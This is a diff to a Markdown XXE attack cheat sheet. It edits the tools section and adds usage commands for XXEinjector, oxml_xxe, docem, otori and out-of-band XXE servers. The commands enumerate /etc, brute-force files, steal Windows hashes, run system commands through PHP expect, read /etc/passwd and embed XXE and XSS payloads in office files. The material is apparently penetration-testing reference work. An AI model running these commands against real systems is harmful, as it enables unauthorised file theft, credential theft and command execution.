@@ -34,39 +34,55 @@ Syntax: `<!ENTITY entity_name SYSTEM "entity_value">`
 
 ## Tools
 
-- [xxeftp](https://github.com/staaldraad/xxeserv)
+- [xxeftp](https://github.com/staaldraad/xxeserv) - A mini webserver with FTP support for XXE payloads
   ```
-  sudo ./xxeftp -uno 443 ./xxeftp -w -wps 5555
+  sudo ./xxeftp -uno 443
+  ./xxeftp -w -wps 5555
   ```
- - [230-OOB](https://github.com/lc/230-OOB) and payload generation via [http://xxe.sh/](http://xxe.sh/)
-   ```
-   $ python3 230.py 2121
-   ```
- - [XXEinjector](https://github.com/enjoiz/XXEinjector)
-   ```bash
-   # Enumerating /etc directory in HTTPS application:
-   ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --ssl
-   # Enumerating /etc directory using gopher for OOB method:
-   ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher
-   # Second order exploitation:
-   ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/vulnreq.txt --2ndfile=/tmp/2ndreq.txt
-   # Bruteforcing files using HTTP out of band method and netdoc protocol:
-   ruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt --file=/tmp/req.txt --oob=http --netdoc
-   # Enumerating using direct exploitation:
-   ruby XXEinjector.rb --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARK
-   # Enumerating unfiltered ports:
-   ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --enumports=all
-   # Stealing Windows hashes:
-   ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --hashes
-   # Uploading files using Java jar:
-   ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --upload=/tmp/uploadfile.pdf
-   # Executing system commands using PHP expect:
-   ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --oob=http --phpfilter --expect=ls
-   # Testing for XSLT injection:
-   ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --xslt
-   # Log requests only:
-   ruby XXEinjector.rb --logger --oob=http --output=/tmp/out.txt
-   ```
+- [230-OOB](https://github.com/lc/230-OOB) - An Out-of-Band XXE server for retrieving file contents over FTP and payload generation via [http://xxe.sh/](http://xxe.sh/)
+  ```
+  $ python3 230.py 2121
+  ```
+- [XXEinjector](https://github.com/enjoiz/XXEinjector) - Tool for automatic exploitation of XXE vulnerability using direct and different out of band methods
+  ```bash
+  # Enumerating /etc directory in HTTPS application:
+  ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --ssl
+  # Enumerating /etc directory using gopher for OOB method:
+  ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher
+  # Second order exploitation:
+  ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/vulnreq.txt --2ndfile=/tmp/2ndreq.txt
+  # Bruteforcing files using HTTP out of band method and netdoc protocol:
+  ruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt --file=/tmp/req.txt --oob=http --netdoc
+  # Enumerating using direct exploitation:
+  ruby XXEinjector.rb --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARK
+  # Enumerating unfiltered ports:
+  ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --enumports=all
+  # Stealing Windows hashes:
+  ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --hashes
+  # Uploading files using Java jar:
+  ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --upload=/tmp/uploadfile.pdf
+  # Executing system commands using PHP expect:
+  ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --oob=http --phpfilter --expect=ls
+  # Testing for XSLT injection:
+  ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --xslt
+  # Log requests only:
+  ruby XXEinjector.rb --logger --oob=http --output=/tmp/out.txt
+  ```
+- [oxml_xxe](https://github.com/BuffaloWill/oxml_xxe) - A tool for embedding XXE/XML exploits into different filetypes (DOCX/XLSX/PPTX, ODT/ODG/ODP/ODS, SVG, XML, PDF, JPG, GIF)
+  ```
+  ruby server.rb
+  ```
+- [docem](https://github.com/whitel1st/docem) - Uility to embed XXE and XSS payloads in docx,odt,pptx,etc
+  ```
+  ./docem.py -s samples/xxe/sample_oxml_xxe_mod0/ -pm xss -pf payloads/xss_all.txt -pt per_document -kt -sx docx
+  ./docem.py -s samples/xxe/sample_oxml_xxe_mod1.docx -pm xxe -pf payloads/xxe_special_2.txt -kt -pt per_place
+  ./docem.py -s samples/xss_sample_0.odt -pm xss -pf payloads/xss_tiny.txt -pm per_place
+  ./docem.py -s samples/xxe/sample_oxml_xxe_mod0/ -pm xss -pf payloads/xss_all.txt -pt per_file -kt -sx docx
+  ```
+- [otori](http://www.beneaththewaves.net/Software/On_The_Outside_Reaching_In.html) - Toolbox intended to allow useful exploitation of XXE vulnerabilities.
+  ```
+  python ./otori.py --clone --module "G-XXE-Basic" --singleuri "file:///etc/passwd" --module-options "TEMPLATEFILE" "TARGETURL" "BASE64ENCODE" "DOCTYPE" "XMLTAG" --outputbase "./output-generic-solr" --overwrite --noerrorfiles --noemptyfiles --nowhitespacefiles --noemptydirs 
+  ```
 
 ## Detect the vulnerability
 
